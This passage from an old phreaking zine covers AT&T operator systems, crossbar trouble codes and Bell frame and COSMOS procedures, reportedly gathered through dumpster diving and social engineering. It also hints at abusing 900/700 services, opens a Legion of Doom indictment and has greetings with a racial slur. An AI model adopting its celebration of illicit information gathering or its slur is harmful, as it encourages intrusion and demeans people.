+and international system function similarly, but with different country
+specific features.
+     The OSPS automated features include Automated Calling Card and Automated
+Coin Toll Services.  The automatic charge recording feature for certain calls
+includes automated announcements, coin-tone detection, and multifrequency tone
+(from touchtone sets,DTMF) detection.  The system can tell if collect calls or
+third-party calls are being charged to a uncollectable number(like payphones,
+non-working numbers, phones with unpaid bills,etc) and informs the operator on
+this.
+
+OPERATOR TERMINALS
+
+     There are three types of operator/agent terminals to match applications
+and customer needs.  All are designed to increase operator comfort and
+performance, reduce training time, and improve flexibility and control.
+
+Video Display Terminal
+     The video display terminal (VDT) is for toll and assistance applications. 
+The VDT's digital voice capability achieves silence between calls and clear
+voice transmission.  The voice features include automatic volume control,
+toll-quality voice path, multiple alerting tone capabilities, and voice-path
+fraud prevention.  Operators and office administrators have the option of using
+mute and split capabilities, which isolate the parties' voice paths at
+appropriate times during a call to eliminate talk-over. (Talk-over is a brief
+message between the caller and the called person while they shouldnt be
+talking.  For example, if collect charges will be accepted be the called party.
+ No more of the "hey dude!! call me back I'm out of codes!!!)  
+     The VDT's keyboard looks pretty good.  Has 117 keys, this includes a
+little dialing pad, to the left of the keyboard where the IBM function keys
+usually are, are keys like hold, 'MUTE', 'SPLIT ON', 'VOL UP', and 'VOL DOWN'. 
+Also I can make out some keys like 'Cancel Call' and 'Make busy'. The keyboard
+is lightweight and detachable, this lets the operators position it easily to a
+comfortable position.  The keyboard has tactile feedback, keys are logical
+grouped, and the most frequently used ones are larger than the rest.  Customers
+can program macro-keys that will initiate a sequence of key strokes with only
+one key.  These are located near the top of the keyboard and have no writing on
+them.  
+     The VDT conveys call-status information and enables operators to follow
+the progression of calls.  The terminal has a large, high-resolution display to
+increase readability, a glare-free, positive video screen (dark characters on
+light background), and a type font that is easy to read.  A screen refresh
+rate, well above current norms, prevents flicker.  In addition, several
+controller capabilities further clarify call information (multiple character
+sets, reverse video, underlining), and are used in a consistent manner to draw
+the operator's attention to particular types fo call-handling information.
+     To minimize movement of the operator's eyes and head, the most critical
+information about a call is displayed at the bottom of the screen.  The display
+shown during a calll relays only the information needed to handle that call. 
+To a avoid distraction, information may be held by the system and not
+displayed.  Fields can be edited locally to reduce time required to correct
+operator keying errors.
+     Now im going to make a pretty pitiful attempt at showing you the screen
+how it appears in a picture I have of it.
+
+    _____     ____      ______                  ____   _____    _______  
+___|SCRN|____|I&C|_____|RATE|__________________|PG1|__|PG2|____|LOGIN| AT&T___ 
+|                                              |                              |
+|                                              |                              |
+|                                              |                              |
+|                                              |                              |
+|                                              |                              |
+|                                              |                              |
+|                                              |                              |
+|                                              |                              |
+|                                              |                              |
+|                                              |                              |
+|______________________________________________|______________________________|
+|                                              |S T A T I O N   C O L L E C T |
+|                                              |                              |
+|                                              |                              |
+|                    3 ___~~  2 ___:)  1 ___~` |Fwd  #  :614-555-6534         |
+|                     |        |        |      |                              |
+|                   :)|        |        |      |                              |
+|                     |        |        |      |                              |
+|                     |___~`   |___~`   |___~` |Bk  #   :312-555-2679         |
+|                        0 + NON - COIN        |                              |
+|                                              |                              |
+|______________________________________________|______________________________|
+
+| QUIT |      |  GET  | | V 3 |  |RATE| |    |  |   |  |AUTO   |  |HOTEL|      
+| RATE |      | RATE  | |     |  |TIME| |    |  |   |  |COLLECT|  |RM #  3
+ 
+    The ":)" are faces. Yes they see faces on the screen and ~~ is a picture of
+a phone. And ~` is a picture of a phone off the hook. Didn't I tell you the
+picture of the operators terminal was going to be pitiful?   
+
+Intelligent Communication Workstation
+     The intelligent communication workstation is for the international market.
+ It has all the functions of the VDT but uses a personal computer with a color
+display.  This adds flexibility to meet the requirements of different countries
+and includes software to assist operators in handling otherf languages.  A
+chinese version of the system, for example, allows the operator to enter names
+using Chinese characters for entry into billing records.  Future releases will
+make this a combined services terminal which can be used for both toll and
+assistance and directory assistance.
+
+Basic-Services Terminal  
+     The basic services terminal (BST) is for directory assistance.  It has a
+20-character display rather than a cathode-ray tube display.  Dedicated
+function keys allow easy access to conference, transfer, and emergency
+functions.  The BST has the same voice features as the VDT.  The display,
+keyvoard arrangement, and call-handling keying sequences minimize operator
+call-handling.
+
+APPLICATIONS
+
+     The OSPS offers services and features for North American and international
+directory assistance, and toll and assistance.  Capacity depends on the
+application and the features required.  System capacities for North American
+applications are shown in the panel below:
+
+Service                   Current           Next System Release
+Directory Assistance        
+Calls/hour                90,000            160,000
+Operator positions        512               1000
+----------------------------------------------------------------
+Toll and Assistance
+Calls/hour                68,000            100,000
+Operator positions        512               700
+----------------------------------------------------------------
+For these applications, call handling capacity is now 68,000 calls an hour for
+toll and assistance and 90,000 calls an hour for difectory assistance.  While
+these high capacities stem from the distributed architecture fo the 5ESS
+switch, its modular design allow the OSPS to grow incrementally depending on
+customer needs.
+     Continuing architectural and design and hardware improvements will lead to
+even higher capacities.  The next system relase, for example, will increase
+toll and assistance to 100,000 calls an hour and directory assistance to
+160,000 calls an hour.
+
+Directory Assistance
+     With directory assistance a caller gives a name and address and an
+operator or the system responds with a phone number.  With vendor computer
+systems, OSPS uses an internal audio response unit to "speak" the number to the
+caller.  Future releases will permit adding or changing announcements by
+interfacing with external audio response units.  Future releases also will
+enable the operator to connect the person requesting the number and apply
+billing in response to the caller's requests.  This provides a telephone
+company with signigicant new revenue opportunities.  OSPS directory assistance
+allows conferences between operators and hand=off of the call to another
+operator.  Incoming directory assistance calls can be rerouted to operators on
+a second OSPS.
+
+Toll and Assistance    
+     These operator services help callers complete toll calls, bill the call to
+calling cards or to a third party,  bill the call person-to-person, and give
+general help.  OSPS uses ISDN to furnish some of these services.  For example,
+the system gives operators access to customer-supplied database computers. 
+These computers may contain frequently referenced data such as emergency
+numbers or rate and route information.  Operators are looged onto the database
+automatically and single key actions transfer data from the data base screen to
+the call handling screen.
+
+International Applications
+     Features start with a subset of the ACD, derectory assistance and basic
+toll and assistance operator call handling features as in the North American
+version.  Specific international needs are addes such as real-time billing
+information, completed call retrieval, call booking, and a visible instruction
+table.
+     Real-time billing information for international calls includes validation
+of credit-card numbers or billing number, computing charges in real time and
+storing them in completed call records.  The billing information can be
+supplied to the customer by a synthesized announcement of time and charges or
+direct operator quotation.
+     Completed call retrieval aallows the operator to retrieve the record of a
+completed call, including call charges in response to customer inquiry.  It
+also allows the operator to give correct billing in the case of a call being
+cut off and reconnected.
+     Call booking is for customers wanting calls placed at a particular time
+and to allow operators to store calls for later completion during less
+congested periods.  Data for these calls is stored in the OSPS and may be
+distributed to operators for setup as soon as possible or at a designated time.
+ Operators also may request retrieval of previously booked calls.  
+     The operator uses a visible instruction table to obtain special dialing
+instructions or otherf call-handling material.  The text is stored in the 5ESS
+switch as a series of pages, and is displayed in a window area on the VDT
+screen.  
+     Additional features include customer and operator fraud protection,
+enhanced charge and duration advice and language assistance, depending on the
+needs of the particular country.  OSPS also supports the major international
+signaling systems.
+
+
+NEXT GENERATION
+
+     The OSPS represents a new generation in operator services based on ISDN. 
+The system can be configured to serve any operator application requiring access
+to data bases and automated call distribution to operators. Since it is a
+application on the 5ESS switch, it allows operator services to be provided at
+local, tandem, or toll switching centers.  
+     The design enables operators to be hundreds of miles from the switch. 
+Features reduce a phone company's costs in the areas of operator expense,
+administration and maaintenance, and network design.  The OSPS includes many
+operator services not previously available and permits a wide mix of
+applications on a single switch.  
+     
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+ 
+
+                    ()--------------------------------()
+                    |                                 |
+                    |  The Cross Bar Switching Guide  |
+                    |           [Xbar #5]             |
+                    |=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=|
+                    |         By Xbar Switchman       |
+                    |  Courtesy of New York Telephone |
+                    |     Operating Staff - Plant     |
+                    ()--------------------------------()
+
+                     Phile #9 of P/HUN Magazine Issue #5
+
+  Special thanks to Lord Micro and Seeker who were the people behind the bins.
+
+Introduction:
+-------------  
+This guide was developed by the Plant Training Center,
+to provide a ready reference of information that  can be used by The Central
+Office Switchman during the performance of his daily work.   
+
+
+Preface:
+--------
+In this part Class "A" reports are only covered. Future issues will have
+MTF Tests/Class C/Alarms/Trouble Recorder etc.
+
+Section #1 - Class "A" Reports        
+------------------------------ 
+     
+CLASS "A" Reports
+-----------------
+Class "A" troubles are those reported by subcribers. Prompt and complete
+handling is very important. Propmtness because the subcribers service may be
+affected and completeness so that the customers service is not impaired  a 
+second time for the same reason. 
+
+If the line is held out of service by euipment note the x-points closed and
+release the line hold magnet to allow the subcribers service. If necessary a
+channel plug may be inserted in the junctor switch portion of the linkage in
+order to release the subcriber's line sooner. The remaining linkage will be 
+help up. So therefore what is done in such problems is to actually trace 
+this held path and analyze to determine why it was held up. To keep Class "A"
+report to a minimum switchman analyze all trouble recorder cards as soon as
+they come in and mark each card for missing or false punches and compare with
+previous cards. In this way repeaters can be spotted quickly and acted upon.
+Usually switchman activate the continuity and ground test circuit of the
+markers at regular  intervals in order to pick up linkage tip and ring 
+troubles. Using this approach, along with regular testing procedures should
+keep common euipment troubles to a minimum.
+
+Here is a list of Class "A" trouble reports:
+
+NDT - No Dial Tone    
+CC - Cant call
+DCLR - Double Connection-Lift Receiver
+PS - Permanent Signal
+COO - Cutoff Outgoing
+DCO - Double Connection Outgoing
+CBDT - Cant Break Dial Tone
+DTWD - Dial Tone While Dialing
+DCWD - Double Connection While Dialing
+NAR - No Audible Ring
+GWN or INTC  - Gets Wrong Number of Intercept
+ATB - All Trunks Busy
+DA - Dont Answer
+GB-FB - Gets Busy-False Busy
+CH - Cant Hear
+CBH Cant Be Heard
+NSY - Noisy 
+DTRWT - Dial Tone Returns While Talking
+XT - Cross Talk
+COL Clicks On Line
+BDR - Cell Doesn't Ring
+DGC - Dont Get Calls
+RI - Reaches Intercept
+FRI Fails  to Reach Intercept
+CIE - Called in Error
+FB - False Busy
+BRCM - Bell Rings - Cant Meet 
+DCI - Double Connection Incoming  
+CT - Cant Trip Ringing
+COI - Cut OFf Incoming
+FDA - False Dont Answer
+
+
+Here are the explanations of Class "A" troubles occurances:  
+
+NDT 
+---
+1) Open between HMDF and L.Lk. Frame.
+2) Open L relay; Loose connection on L relay; open T or R connections on L.Lk.
+   Frame; Open hold magnet.
+3) Paritially Energized L relay or Hold Magnet.
+4) Hold magnet help operated.
+5) Dirty contacts or no follow on line hold off normal contacts.
+6) Line switch and junction switch cross points .
+7) If heavy reports from one frame check LLMC.
+8) Review trouble cards for DT Marker Trouble.
+9) Routine Originating Registers for dial tone.
+
+DCLR
+----
+1) Check for bent select fingers on L.SW & all J.SW's.
+2) Check for false operation of 2 or more line hold magnets on Incoming and
+   Outgoing calls.
+3) Review trouble cards for  DT markers - especially "X" indicators
+4) Review trouble cards on DT markers for LXP or JXP indicators.
+
+PS 
+--
+1) Shorted T & R.
+2) False ground on ring side.
+3) If Linkage fails to release-trace and check for linkage or PSHT trouble.
+  
+COO
+---
+1) Loose Connection on T, R  or S lead.
+2) Poor make of L.Lk Cross Points.
+3) Poor make  of hold magnets off normals
+4) Review Completing Marker Trouble cards  for LXP type trouble o outgoig 
+   calls.
+5) If heavy reports from 1 line link frame check LLC.
+6) Possible Pretranslator or PRTC Trouble
+
+DCO
+---
+1) Inspect for cross T & R.
+2) Inspect for bent select fingers or 2 selectes operated.
+3) Inspect for 2XPTS Closed on same horizontal.
+4) Check Comp. MArker Touble Cards (for "X" indications)
+5) Check Comp. Marker Trouble Cards (for LXP; JXP indications)
+6) Possible doulbe wiring on trunks apperance on TLK frame.
+7) False SL inidications.
+
+CBDT
+----
+1) Possible hihg resistance on subcribers line.
+2) Routing Originating registers (DT Test). 
+  
+DTWD
+----
+1) Loose sleeve connection.
+2) LLK XPTS poor sleeve conection.
+3) False release of O.R
+4) Pretranslator.
+
+DCWD
+----
+1) Crossed T or R.
+2) False selected bar operation.
+3) Bent select finger.
+
+NAR
+---
+1) Trunk pre-trip.
+2) Stuck sender or register.
+3) subcriber class of service wiring.
+4) Out sender link X-Points.
+5) Wrong TB-TG wiring of Outgoing Trunk.
+6) Wrong  RN trunk X connection.
+7) Wrong trunk options.
+8) Trasverter-Transverter Connector.
+9) Recorder.
+At terminating end:
+1) Ringing selection switch.
+2) Incoming Trunk Wiring.
+3) Linkage.
+
+GWN  or INTC
+------------
+1) Loose tip and/ or ring.
+2) Unbalanced subcriber line.
+3) Marker Wiring and Number group wiring.
+4) Originating register or outgoing sender trouble.
+5) Wrong TB-TG-RN Trunk or TLK frame.
+6) FAT frame wiring
+
+DA
+--
+1) Incoming register trouble.
+2) Ringing selection switch trouble.
+3) Wrong NG Wiring.
+4) Incoming trunk R Relay adjustment.
+5) Open T or R from Incoming trunk to called subscriber.
+6) Outgoing trunk supervision trouble.
+
+GB-FB
+-----
+1) Might be overflow instead of busy.
+2) Outgoing trunk trouble.
+3) Wiring number group wiring.
+4) Ringing selection switch trouble.
+5) Incoming Trunk wiring
+6) Troulbe release by Marker.
+
+CH
+--
+1) Subcriber's line has high resistance.
+2) Swinging or poor wiring  connections-tip or ring.
+3) Dirty X points (tip or ring).
+4) Outgoing trunk-poor transmission.
+
+CBH
+---
+1) Subscriber's line has high resistance.
+2) Swinging or poor wiring connections tip or ring.
+3) Dirty X points (tip or ring).
+4) Poor transmissions on trunks.
+
+NSY
+---
+1) Loose Connection tip or ring.
+2) Dirty pins on 444 jack on VMDF.
+3) Tip or Ring resistance cross.
+4) Outgoing trunk transmission.
+5) Induction on subcriber's line.
+6) Dirty contacts in talking linkage.
+
+DTRWT
+-----
+1) False release of outgoing trunk or incoming trunk euipment.
+2) Poor connection  or dirty contacts of sleeve lead of talking path.
+   
+XT
+--
+1) Before dial tone
+     a) Line link double connection.
+     b) Induction on subcriber's line.
+2) After dial tone
+     a) Trunk cable induction.
+
+COL
+---
+1) Vibrating relay.
+2) Riding selector.
+3) Wiring interference.
+4) Improper testing.
+5) Loose connection in talking path.
+
+BDR
+---
+1) Open T or R from incoming trunk to subcriber's line.
+2) Grounded ring in linkage.
+3) Defective incoming trunk.
+4) Ringing selection switch trouble 
+5) Incoming register trouble.
+6) Wrong NG or ADF wiring.
+7) Check trouble cards for CON and FCG failures on incoming calls.
+
+DCG, RI, FRI, CIE
+----------------- 
+1) Number group or ADF wiring.
+2) Open sleeve in linkage.
+3) Incoming register trouble.
+4) Incoming trunk options or wiring.
+
+FB
+--
+1) Possible incoming X'd sleeve.
+2) Possible LG relay cross.
+3) Possible help up on incoming call.
+4) Possible help up by operator.
+
+* ITEMS 3 and 4 HOLD CONNECTION WITH CHANNEL PLUG AND MAKE TRACE BACK-IF HELD
+  BY OPERATOR GET REASON.
+
+BRCM
+----
+1) Open Tip or Ring (T or R )     
+2) Unbalanced line.
+3) Crossed ring sides. 
+4) Loose or open sleeve-possible 1 ring.
+5) Incoming trunk trouble .
+
+DCT
+---
+1) Crossed sleeves (2 hold magnets)
+2) 2 select bars operating
+3) 2 LG relays operating.
+   
+CT
+--
+1) Defective incoming trunk.
+2) Possible high resistance ring side.
+
+COI
+---
+1) Incoming trunk trouble (false release).
+2) Loose or dirty contacts of sleeve of incoming connection.
+
+FDA
+---
+1) Reaching wrong #'s possible- see GWN.
+2) Ringing selection switch trouble.
+3) Incoming trunk trouble.
+4) Incoming linkage open T or R.
+5) Called sub line open T or R.
+  
+End of PART 1
+-------------
+Well this article will conclude on future issues. Hopefully now you have a 
+better understanding of all kinds of troubles reported to the Xbar office.
+This article is a little complicated to follow and DOES require the basic 
+understanding of No. 5 Crossbar Switching System. 
+
+Would also like say thanks to Lord Micro and Seeker who were the people behind
+the bins at a local office.
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+ 
++--------------------------------------------------------+
+|        SSWC - Bell Research Report (Vol III)           |
+|--------------------------------------------------------|
+|        Phile #10 of P/HUN Magazine Issue #5            |
++--------------------------------------------------------+
+
+         All research gathered, tested and mastered by the original 
+         members of SSWC: 
+ 
+         Chance - The Technician - Cellular Phantom 
+ 
+         After the large response we have received after writing our 
+         first two Bell Research report documents, we have chosen to 
+         continue our discussions on the ever intriguing Bell System 
+         and its many fascinating departments. Note that the 
+         information in this file is subject to change. However, we 
+         will try to keep you updated as much as possible. 
+ 
+ 
+    In our in depth research and social engineering practices of the 
+ Bell System, we have discovered an important plan which frameworkers 
+ and switch technicians must follow. This plan is known as the Frame 
+ Force Management Plan (FFMP), which is a guide to obtain maximum 
+ benift from the performance of frameworkers. (In other words this  
+ plan is used so the Bell System can make sure there frameworkers 
+ don't drop the ball). This plan may be used in either a centralized 
+ frame environment or a local a local wire center. It provides  
+ techniques for the manager to use in estimating the work load (demand 
+ and programmable frame work) and matching the available frame 
+ personnel to the expected work. The plan also provides information 
+ for the manager to analyze and evaluate the results of these 
+ techniques. In essence, the plan aids supervision in ensuring that: 
+ 
+   * Work is available to ensure adequate load exists for the 
+     available time. 
+ 
+   * Adequte personnel is available to complete necessary work. 
+ 
+   * Work is assigned in a correct sequence to minimize impact on 
+     other personnel. 
+ 
+   * Completed work is evaluated to ensure its efficiency and quality. 
+  
+   * Work and personnel are scheduled to meet due date commitments. 
+ 
+ 
+     Note: The records, reports and status information for this plan 
+           may be administered in the local distributing frame  
+           enviornment, a Frame Control Center (FCC) or a Frame Work 
+           Station (FWS) in a Switching Control Center (SCC). 
+ 
+ 
+    This plan provides frame managers with suggested procedures to  
+ develope forcasts or estimates of future work volumes. With this 
+ knowledge, the manager should be able to accomplish the following: 
+ 
+ 
+ 
+   * Meet subscriber demands. 
+  
+   * Program company-generated work. 
+ 
+   * Ensure that all employees are assigned productively. 
+ 
+     
+   To avoid possbile misunderstanding, the following definitions are 
+   provided. 
+ 
+ 
+ Distributing Frame:    Main Distributing Frame (MDF), Intermediate  
+                        Distributing Frame (IDF), Line Distributing 
+                        Frame (LDF), Trunk Distributing Frame (TDF), 
+                        No. Group, Translator, Block Relay,  
+                        No. Network (Automatic Number Identification) 
+                        [ANI] and any other frame performaing 
+                        functions related to work covered by this 
+                        plan. 
+ 
+ Frame Control Center:  An administrative center that performs 
+                        pricing, packaging, force loading, tracking, 
+                        and force administration for centralized 
+                        frame operations. 
+ 
+ Frame Work Station:    A work station that is responsible for the 
+                        functions of the FCC on a smaller scale. It 
+                        is located in an SCC. 
+ 
+ Programmable Work:     Programmable work requests consist of the same 
+                        work requests that are included in demand 
+                        work. The difference is that the programmable 
+                        work requests are received before the due date 
+                        in time to schedule thier completion. Examples 
+                        of programmable work are: 
+  
+                            * Service Orders 
+                            * Trunk Orders 
+                            * Special Service Orders 
+                            * Verifications 
+                            * Cable Transfers 
+                            * Routine maintenance 
+                            * Line Equiptment Transfers 
+                            * Service Observing (Remote 
+                              Observation[REMOB]) 
+ 
+        
+    In a Cosmos environment, the following activites should be 
+    conducted to ensure data base accuracy: 
+ 
+    * Prompt and accurate frame service order completion 
+      notifications. 
+ 
+ 
+ 
+    * Use of the order status procedures for notifying the Loop 
+      Assignment Center (LAC) and other control centers of 
+      discrepancies and pending order status encountered that 
+      contradict the Cosmos frame work order or prevent frame 
+      order completing. 
+ 
+ 
+    The average service order for an MDF consists of two basic 
+ operations: (1) the jumper on the Main Distributing Frame (MDF), 
+ and (2) the cross-connections for the telephone number, billing, 
+ and line equipment. (Modular and Common System Main Interconnecting 
+ Frame [COSMIC]) systems' types of cross-connects. COSMIC; developed 
+ by AT&T.  
+ 
+ 
+     Next we will discuss how Cosmos is used in aiding Frameworkers 
+     and Frame Technicians. 
+ 
+     The Computer System for Main Frame Operations (COSMOS) is a 
+ mechanized record and assignment system designed to maintain 
+ accurate records of Main Distributing Frame (MDF) facilities and 
+ efficiently administer desired assignment of exchange facilities.  
+ Cosmos maintains a record of all line equiptment, exchange cable 
+ pairs, and telephone numbers served by the wire center. 
+  
+    Cosmos is a very useful tool in administering frame work in a 
+ central office. It allows increased productivity and gives the 
+ frame supervisor much greater visibility of the projected work  
+ load. However, Cosmos will not automatically create order out of 
+ chaos. 
+ 
+    The purpose of Cosmos is to assign the shortest possible MDF 
+ jumper connection between CO line equiptment and the cable pair 
+ serving the customer. 
+ 
+    With the Dedicated Inside Plant (DIP) administration, Cosmos aids 
+ in reusing as many spare jumpers as possible. When a D-Order (dis- 
+ connect order) is processed, the possibility of reusing the existing 
+ jumper on a new connect service order is considered. Re-using a 
+ jumper eliminates extra work and reduces the possibility of wiring 
+ errors. 
+ 
+    Frame work is performed from the Cosmos output whether the order 
+ is a service order or work order. When a service order cannot be  
+ worked, the frame workers should establish a jepordy report in  
+ Cosmos. Enough information must be provided so that the LAC can 
+ take appropriate action, without having to call the frame. 
+ 
+    Because Cosmos will only print out orders due on the date 
+ requested, and because an inquiry can be made on any pending orders 
+ in Cosmos by order number, it is not necessary to file orders 
+ by due date or by order number. However, it is necessary to be able 
+  
+ to find orders that have been modified, cancelled, or changed. 
+ 
+    Next we will briefly discuss the Cosmos orders filing system, 
+ which can be divided into two parts: (1) pending orders, and 
+ (2) Main Distributing Frame (MDF) completed orders. In each section 
+ the orders will be filed by exchange code. Circuits without a 
+ telephone number are filed in a separate "private line bin" 
+ *(however, we regret that we have not fully understood and research 
+ this section of the filing system, due to its uncommon use). The 
+ service orders in the pending section are those which for one  
+ reason or another, cannot be worked at present. These include orders 
+ that have had the due dates advanced or that require the installers 
+ go-ahead. A separate file area is kept for orders in jepordy.  
+ When an order is MDF-complete, it is placed in the complete order 
+ section. Work orders such as (cable pairs transfers, line equiptment 
+ transfers) should be filed in the pending order section by order  
+ number. In the completed section, work orders should be filed 
+ by telephone exchange and remaining telephone number, along with 
+ service orders. Orders in the complete section are only retained 
+ for a few weeks only. Usually after a two week period those  
+ completed orders are removed.  
+ 
+ 
+    The responsibility of the frame with Cosmos is to enter the  
+ status of all work orders into the system. The frame also shares 
+ the responibility for reporting data base validity, and is  
+ responsible for reporting any data base errors to the originator 
+ of the order as well as performing periodic verifications of the 
+ data base, to insure proper functioning of the data base. 
+ 
+    We will now briefly discuss the Cosmos Frame Work Management (FWM) 
+ module. The Cosmos FWM supports a Frame Control Center (FCC), a  
+ Switching Control Center (SCC), or a traditional wire center location 
+ by mechanizing the clerical effort involved in sorting, pricing, and 
+ packaging Plain Old Telephone Service (POTS) frame work orders. The 
+ module automatically developes work packages, either by due date,  
+ order type, frame location, switching type or in any combination 
+ which meets assignment requirements. 
+ 
+ 
+ 
+  We would like to thank the following organizations and thier members 
+  for being truly innovative hackers: 
+ 
+  EVERYONE IN THE TIS CLUB, EVERYONE AT 2600 MAGAZINE, DPAK AND 
+  SUPERNIGGER, PHORTUNE 500, THE BAD BOYS, THE TECHNICIAN WOULD LIKE 
+  SAY, "HELLO TO RED KNIGHT, MY BOY TONY FROM THE SWITCHING CONTROL 
+  CENTER, AND KEY PULSE - A REALLY INNOVATIVE GUY!". CELLULAR PHANTOM 
+  WOULD LIKE TO SAY, "THIS FILE IS DEDICATED TO: THE GIRL WITH THE 
+  LITTLE RED SHOES, SHE LIKES TO PARTY, SHE LIKES TO BOOZE, SHE LOST 
+  HER CHERRY BUT THATS NO SIN, SHE STILL GOT THE BOX THE CHERRY CAME 
+  IN". HELLO TO BRADLY IN OHIO, SUB ZERO, AND ALL MY BOYS BACK AT 
+  CUYAHOGA HILLS BOYS SCHOOL (JAIL IS A FUCKED UP PLACE ISN'T IT?). 
+ 
+ * SSWC: The leader of Innovative hacking! 
+ 
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+                       Phile #11 of P/HUN Issue #5
+
+                        CARRIER 900/700 SERVICE
+                    
+                          WRITTEN BY TONE TEC
+
+          On November 30,  1988,  the FCC approved a tariff which makes
+          900/700 Services available to all Carriers.   Prior to  this,
+          only  AT&T  provided information services thru  900  numbers. 
+          The 900/700 service offers enhanced information  capabilities
+          such as
+             * interactive group conversations
+             *  recordings  for weather status,  sports  scores,  music
+          news,etc.
+
+          The  900/700  Service differs from the 976  product  in  that
+          900/700  Services  are carried interLATA  and  interstate  as
+          opposed to intraLATA (LATA in telco lingo means Local  Access
+          Transport Area).  Also the Carrier offers the Service to  the
+          Information  Provider(IP)  who is  considered  the  Carrier's
+          customer.  This differs from 976 Service where the IP is  the
+          local telco's customer.
+
+          But what does all this mean to you,  John Phrack?  Why,  more
+          confusion,  of  course,  as  to just  who  is  handling  your
+          billing.  Detail  for  900/700 messages will  appear  on  the
+          appropriate Carrier toll page of your bill.  Messages will be
+          interspersed  with other LD calls placed thru  same  carrier.
+          The cost varies from 50 cents per minute to 2.00.
+
+          The  method used for reaching a 900 or 700  service  differs.
+          Calls  to  900  numbers may always be  completed  by  dialing
+          1+900+NNX+XXXX  (NXX being the Exchange or C.O.  code).  Each
+          900 NNX is carrier specific and customers will not always  be
+          aware of which carrier is providing the service.  Example:  A
+          customer  with  AT&T as the chosen 1+ carrier could  dial  an
+          advertised  900# provided by Allnet.   Since the service  was
+          reached  without dialing Allnet's access code,  the  customer
+          may expect the call to appear under AT&T's charges.  WRONGO!
+
+          Calls to 700 numbers are completed by dialing  1+700+NNX+XXXX
+          or  10XXX+1+700+NNX+XXXX depending on the  customers  primary
+          carrier.  Each  700 NNX is not  Carrier  specific,  therefore
+          customers will be aware of which Carrier is providing the 700
+          Service.  Advertisements  for 700 Services will  appear  with
+          appropriate  5-digit Carrier code.  Allnet Communications  is
+          the  first  carrier  to process  700  Service  messages.  The
+          content  of the 700 Service may be a recorded  message,  live
+          convo,  or  prompts  to enter responses thru the  use  of  TT
+          keypad.  "Live Convo"  programs won't be monitored  by  local
+          telco, but will be monitored 24 hours a day, 7 days a week by
+          Allnet. (Are you kidding?)
+
+          By the way, if you choose to abuse this service from home (or
+          your  best bud's home) there is a nifty device  available  to
+          the Carrier call Selective Carrier Denial (SCD).  This is  an
+          optional  restriction  service available to  the  carrier  to
+          restrict  the  end  user from  accessing  their  network  via
+          1+,0+,00- and 10XXX dialing.  This does not affect access  to
+          the local network. SCD is only designed to restrict customers
+          with One-Party service.
+
+          Surely    there   exists   some   exciting   new    phreaking
+          potentialities out of all this.............................
+
+
+
+                             ALLNET 700 SERVICE
+
+          NUMBER      PROGRAM NAME   DESCRIPTION OF PROGRAM   CHARGE
+
+          222-2222    US TALKLINE    GROUP BRIDGING SERVICES  $.99P/MIN
+                                     INTENDED FOR INDIVIDUAL
+                                     18 YEARS OF AGE AND UP
+
+          444-4444    PARTY LINE     GROUP BRIDGING SERVICES  $1.00 P/M
+                                     INTENDED FOR INDIVIDUAL
+                                     18 YEARS OF AGE AND UP
+
+          666-6666    TALKNET USA    GROUP BRIDGING SERVICES  $.99 P/M
+                                     INTENDED FOR INDIVIDUAL
+                                     18 YEARS OF AGE AND UP
+
+          700-7000    GABB LINE      GROUP BRIDGING SERVICES  $1.95 1/M
+                                     INTENDED FOR INDIVIDUAL  $.99EA AD
+                                     18 YEARS OF AGE AND UP 
+          825-5121    TALK ONE       NATIONWIDE AUDIENCE OF   $1.491/M
+                                     INDIVIDUALS WHO LIKE     $1.49AD M
+                                     TO SPEAK ON THE PHONE
+
+          999-9999    ACCESS USA     GROUP BRIDGING SERVICES  $.95 P/M
+                                     INTENDED FOR INDIVIDUAL
+                                     18 YEARS OF AGE AND UP
+
+          546-9467    SPORTS         AUDIENCE PRIMARILY MADE  $5.00P CL
+                                     UP OF ADULT MALE SPORTS
+                                     ENTHUSIASTS. RECORDING
+
+          539-4263    SPORTS         AUDIENCE PRIMARILY MADE  $5.00P CL
+                                     UP OF ADULT MALE SPORTS
+                                     ENTHUSIASTS. RECORDING
+
+
+          ALLNET 900 SERVICE
+
+          909-JEFF    DIAL-A-ROCKER  AUDIENCE PRIMARILY MADE  $2.00 1/M
+                                     UP OF RAPPER FANS OF     $.45EA/AD
+                                     D.J. JAZZY JEFF
+
+
+          (Uh sorry, folks, but I just had to throw that one in. I know
+          my day is more complete with that 900 # available to me) hehe
+
+                                     TONE
+
+===============================================================================
+
+
+                     -=Phile #12 of P/HUN Issue #5=-
+                       ----------------------------
+
+
+From: telecom@eecs.nwu.edu (TELECOM Moderator)
+Newsgroups: comp.dcom.telecom
+Subject: Legion of Doom Indictments (Chicago Members, Jolnet Shutdown)
+Date: Sat, 31-Mar-90 20:05:00 EDT
+Organization: TELECOM Digest
+X-Telecom-Digest: Special Issue: LoD in Trouble!
+
+
+TELECOM Digest     Sat, 31 Mar 90 19:05:00 CST    Special: LoD in Trouble!
+
+Inside This Issue:                         Moderator: Patrick A. Townson
+
+    Legion of Doom Indictments (Chicago Members) [Mike Godwin]
+----------------------------------------------------------------------
+
+From: Mike Godwin <walt.cc.utexas.edu!mnemonic@cs.utexas.edu>
+Subject: Legion of Doom Indictments (Chicago Members, Jolnet Shutdown)
+Date: 31 Mar 90 22:37:33 GMT
+Reply-To: Mike Godwin <walt.cc.utexas.edu!mnemonic@cs.utexas.edu>
+Organization: The University of Texas at Austin, Austin, Texas
+
+
+The following is the text of the federal indictments of the Chicago
+Jolnet members. Secret Service jurisdiction to investigation these
+alleged computer-related offenses comes from 18 USC 1030, the general
+computer-fraud statute -- it's provided in section (d) under this
+statute.
+
+              UNITED STATES DISTRICT COURT NORTHERN
+                      DISTRICT OF ILLINOIS
+                        EASTERN DIVISION
+
+                               )
+UNITED STATES OF AMERICA       )
+                               )
+          v.                   )    No. ______________________
+                               )    Violations: Title 18, United
+ROBERT J. RIGGS, also known    )    States Code, Sections
+as Robert Johnson, also        )    1030(a)(6)(A) and 2314
+known as Prophet, and          )
+CRAIG NEIDORF, also known      )
+as Knight Lightning            )
+
+                            COUNT ONE
+
+     The SPECIAL APRIL 1987 GRAND JURY charges:
+
